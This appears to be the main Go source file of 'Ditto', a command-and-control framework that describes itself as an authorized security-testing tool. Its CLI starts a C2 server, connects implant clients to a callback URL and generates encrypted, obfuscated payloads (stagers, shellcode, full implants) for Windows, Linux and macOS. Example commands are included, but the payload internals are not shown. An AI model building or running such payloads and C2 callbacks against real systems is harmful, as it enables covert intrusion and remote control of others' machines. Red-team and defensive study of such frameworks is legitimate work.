// Ditto - Advanced Security Testing Framework
// WARNING: This tool is for AUTHORIZED security testing and educational purposes ONLY.
// Unauthorized use of this software is illegal and may result in criminal prosecution.
// Use only on systems you own or have explicit written permission to test.
//
// This framework demonstrates security testing concepts for defensive security research.
// Always comply with applicable laws and regulations in your jurisdiction.

package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"strings"

	"github.com/ditto/ditto/core"
	"github.com/ditto/ditto/internal/cliui"
	"github.com/ditto/ditto/modules"
	"github.com/ditto/ditto/payload"
	"github.com/ditto/ditto/transport"
)

var (
	version   = "1.0.0"
	buildTime = "unknown"
	gitCommit = "unknown"
)

func main() {
	var (
		mode        = flag.String("mode", "server", "Operation mode: server, client, generate, or interactive")
		config      = flag.String("config", "", "Configuration file path")
		callbackURL = flag.String("callback", "", "Client callback URL")
		payloadType = flag.String("payload", "stager", "Payload type: stager, shellcode, or full")
		output      = flag.String("output", "", "Output file path")
		arch        = flag.String("arch", "amd64", "Target architecture: amd64, 386, arm64")
		osTarget    = flag.String("os", "linux", "Target OS: linux, windows, darwin")
		encrypt     = flag.Bool("encrypt", true, "Enable payload encryption")
		obfuscate   = flag.Bool("obfuscate", true, "Enable code obfuscation")
		debug       = flag.Bool("debug", false, "Enable debug logging")
		showVersion = flag.Bool("version", false, "Show version information")
		showHelp    = flag.Bool("help", false, "Show help information")
		pretty      = flag.Bool("pretty", false, "Enable colors and formatting even when not a TTY")
		noBanner    = flag.Bool("no-banner", false, "Disable banner display")
		menu        = flag.Bool("menu", false, "Show interactive menu for common operations")
	)

	flag.Usage = printUsage
	flag.Parse()

	// Handle --pretty flag
	if *pretty || os.Getenv("DITTO_PRETTY") == "1" {
		cliui.EnableColors()
	}

	// Handle --no-banner flag
	if *noBanner {
		os.Setenv("DITTO_NO_BANNER", "1")
	}

	// Show help
	if *showHelp {
		printUsage()
		os.Exit(0)
	}

	if *showVersion {
		fmt.Printf("Ditto v%s\nBuild: %s\nCommit: %s\n", version, buildTime, gitCommit)
		os.Exit(0)
	}

	// Handle --menu flag
	if *menu {
		handleMenu()
		os.Exit(0)
	}

	// Initialize logger
	logger := core.NewLogger(*debug)
	
	// Print banner if appropriate (unless disabled)
	if !*noBanner && os.Getenv("DITTO_NO_BANNER") == "" {
		switch *mode {
		case "server", "interactive", "":
			// Banner will be printed in interactive server
		default:
			// Print banner for other modes using UX layer
			cliui.Banner("Ditto", version)
			logger.Info("Initializing Ditto...")
		}
	}

	// Load configuration
	cfg, err := core.LoadConfig(*config)
	if err != nil {
		logger.Warn("Using default configuration: %v", err)
		cfg = core.DefaultConfig()
	}

	// Validate authorization
	if !cfg.Authorized {
		cliui.PrintError(cliui.NewUserError(
			"Authorization check failed. This tool requires explicit authorization.",
			"Ensure your configuration file has authorized=true set.",
		))
		os.Exit(1)
	}

	switch *mode {
	case "server":
		// If server mode specified, start interactive server CLI
		runInteractive(logger, cfg)
	case "client":
		runClient(logger, cfg, *callbackURL)
	case "generate":
		generatePayload(logger, cfg, *payloadType, *output, *arch, *osTarget, *encrypt, *obfuscate)
	case "interactive":
		runInteractive(logger, cfg)
	default:
		// Default to interactive server mode if no mode specified or invalid mode
		runInteractive(logger, cfg)
	}
}

func runServer(logger *core.Logger, cfg *core.Config, listenAddr string) {
	logger.Info("Starting C2 server on %s", listenAddr)
	
	server := transport.NewServer(cfg, logger)
	if err := server.Start(listenAddr); err != nil {
		cliui.PrintError(cliui.NewUserError(
			fmt.Sprintf("Server failed: %v", err),
			"Check if the port is already in use or try a different address",
		))
		os.Exit(1)
	}
}

func runClient(logger *core.Logger, cfg *core.Config, callbackURL string) {
	if callbackURL == "" {
		cliui.PrintError(cliui.NewUserError(
			"Callback URL is required for client mode",
			"Use --callback <url> to specify the server URL",
		))
		os.Exit(1)
	}
	
	// Validate callback URL format
	if !strings.HasPrefix(callbackURL, "http://") && !strings.HasPrefix(callbackURL, "https://") {
		cliui.PrintError(cliui.NewUserError(
			fmt.Sprintf("Invalid callback URL format '%s'", callbackURL),
			"Expected format: <protocol>://<host>[:<port>]\n  Valid protocols: http, https",
		))
		os.Exit(1)
	}
	
	logger.Info("Starting client connection to %s", callbackURL)
	
	client := transport.NewClient(cfg, logger)
	if err := client.Connect(callbackURL); err != nil {
		cliui.PrintError(cliui.NewUserError(
			fmt.Sprintf("Client connection failed: %v", err),
			"Check network connectivity and server URL",
		))
		os.Exit(1)
	}
	
	client.Run()
}

func generatePayload(logger *core.Logger, cfg *core.Config, payloadType, output, arch, osTarget string, encrypt, obfuscate bool) {
	if payloadType == "" {
		cliui.PrintError(cliui.NewUserError(
			"Payload type is required",
			"Use --payload <type> where type is one of: stager, shellcode, full",
		))
		os.Exit(1)
	}
	
	if arch == "" {
		cliui.PrintError(cliui.NewUserError(
			"Architecture is required",
			"Use --arch <arch> where arch is one of: amd64, 386, arm64",
		))
		os.Exit(1)
	}
	
	if osTarget == "" {
		cliui.PrintError(cliui.NewUserError(
			"Target OS is required",
			"Use --os <os> where os is one of: linux, windows, darwin",
		))
		os.Exit(1)
	}
	
	// Validate payload type
	validTypes := map[string]bool{"stager": true, "shellcode": true, "full": true}
	if !validTypes[payloadType] {
		cliui.PrintError(cliui.NewUserError(
			fmt.Sprintf("Invalid payload type '%s'", payloadType),
			"Valid types: stager, shellcode, full\n  Example: --payload full",
		))
		os.Exit(1)
	}
	
	// Validate OS
	validOS := map[string]bool{"linux": true, "windows": true, "darwin": true}
	if !validOS[osTarget] {
		cliui.PrintError(cliui.NewUserError(
			fmt.Sprintf("Invalid OS '%s'", osTarget),
			"Valid OS: linux, windows, darwin\n  Example: --os windows",
		))
		os.Exit(1)
	}
	
	// Validate architecture
	validArch := map[string]bool{"amd64": true, "386": true, "arm64": true}
	if !validArch[arch] {
		cliui.PrintError(cliui.NewUserError(
			fmt.Sprintf("Invalid architecture '%s'", arch),
			"Valid architectures: amd64, 386, arm64\n  Example: --arch amd64",
		))
		os.Exit(1)
	}
	
	logger.Info("Generating payload: type=%s, arch=%s, os=%s", payloadType, arch, osTarget)
	
	// Create module registry for payload generation
	moduleRegistry := modules.NewModuleRegistry(logger)
	
	options := payload.Options{
		Type:      payloadType,
		Arch:      arch,
		OS:        osTarget,
		Encrypt:   encrypt,
		Obfuscate: obfuscate,
		Config:    cfg,
	}
	
	gen := payload.NewGenerator(logger, moduleRegistry)
	data, err := gen.Generate(options)
	if err != nil {
		cliui.PrintError(cliui.NewUserError(
			fmt.Sprintf("Payload generation failed: %v", err),
			"Check your configuration and try again",
		))
		os.Exit(1)
	}
	
	if output == "" {
		output = fmt.Sprintf("payload_%s_%s_%s.bin", payloadType, osTarget, arch)
	}
	
	if err := os.WriteFile(output, data, 0755); err != nil {
		cliui.PrintError(cliui.NewUserError(
			fmt.Sprintf("Failed to write payload: %v", err),
			"Check file permissions and disk space",
		))
		os.Exit(1)
	}
	
	fmt.Printf("%s Payload generated successfully: %s\n", cliui.C.Green("✓"), output)
}

// printUsage prints comprehensive help information
func printUsage() {
	cliui.Banner("Ditto", version)
	fmt.Println()
	fmt.Println(cliui.C.Bold("USAGE"))
	fmt.Println()
	fmt.Println("  ditto [flags] [command]")
	fmt.Println()
	
	cliui.H1("DESCRIPTION")
	fmt.Println()
	fmt.Println("  Ditto is an advanced security testing framework for authorized security research.")
	fmt.Println("  Use only on systems you own or have explicit written permission to test.")
	fmt.Println()
	
	cliui.H1("COMMANDS")
	fmt.Println()
	commands := map[string]string{
		"server":     "Start interactive server mode (default)",
		"client":     "Connect as client to a C2 server",
		"generate":   "Generate a payload",
		"interactive": "Start interactive server mode (alias for server)",
	}
	for cmd, desc := range commands {
		fmt.Printf("  %-12s  %s\n", cmd, desc)
	}
	fmt.Println()
	
	cliui.H1("FLAGS")
	fmt.Println()
	flag.VisitAll(func(f *flag.Flag) {
		usage := f.Usage
		if f.DefValue != "" {
			usage += fmt.Sprintf(" (default: %s)", f.DefValue)
		}
		fmt.Printf("  -%s\n", f.Name)
		fmt.Printf("      %s\n", usage)
		fmt.Println()
	})
	
	cliui.H1("EXAMPLES")
	fmt.Println()
	cliui.Bullets([]string{
		"Start interactive server:\n    ditto --mode server",
		"Generate a Windows payload:\n    ditto --mode generate --payload full --os windows --arch amd64",
		"Connect as client:\n    ditto --mode client --callback http://192.168.1.100:8443",
		"Enable pretty output:\n    ditto --pretty --mode generate --payload stager",
	})
	fmt.Println()
	
	cliui.H1("ENVIRONMENT")
	fmt.Println()
	envVars := map[string]string{
		"DITTO_NO_BANNER": "Disable banner display (same as --no-banner)",
		"DITTO_PRETTY":    "Enable colors and formatting (same as --pretty)",
		"NO_COLOR":        "Disable all colors (takes precedence)",
		"COLUMNS":         "Set terminal width for wrapping",
		"TERM":            "Terminal type (dumb disables colors)",
	}
	cliui.KV(envVars)
	fmt.Println()
	
	cliui.H1("EXIT CODES")
	fmt.Println()
	fmt.Println("  0  Success")
	fmt.Println("  1  General error")
	fmt.Println("  2  Invalid command or flag")
	fmt.Println()
}

// handleMenu shows an interactive menu for common operations
func handleMenu() {
	ctx := context.Background()
	
	options := []string{
		"Start interactive server",
		"Generate payload",
		"Connect as client",
		"Show help",
		"Exit",
	}
	
	idx, _, err := cliui.Choose(ctx, "What would you like to do?", options, 0)
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		return
	}
	
	switch idx {
	case 0:
		fmt.Println("\nStarting interactive server...")
		fmt.Println("(Use --mode server to start directly)")
	case 1:
		fmt.Println("\nTo generate a payload:")
		fmt.Println("  ditto --mode generate --payload <type> --os <os> --arch <arch>")
		fmt.Println("\nExample:")
		fmt.Println("  ditto --mode generate --payload full --os windows --arch amd64")
	case 2:
		fmt.Println("\nTo connect as client:")
		fmt.Println("  ditto --mode client --callback <url>")
		fmt.Println("\nExample:")
		fmt.Println("  ditto --mode client --callback http://192.168.1.100:8443")
	case 3:
		printUsage()
	case 4:
		fmt.Println("Exiting...")
	}
}

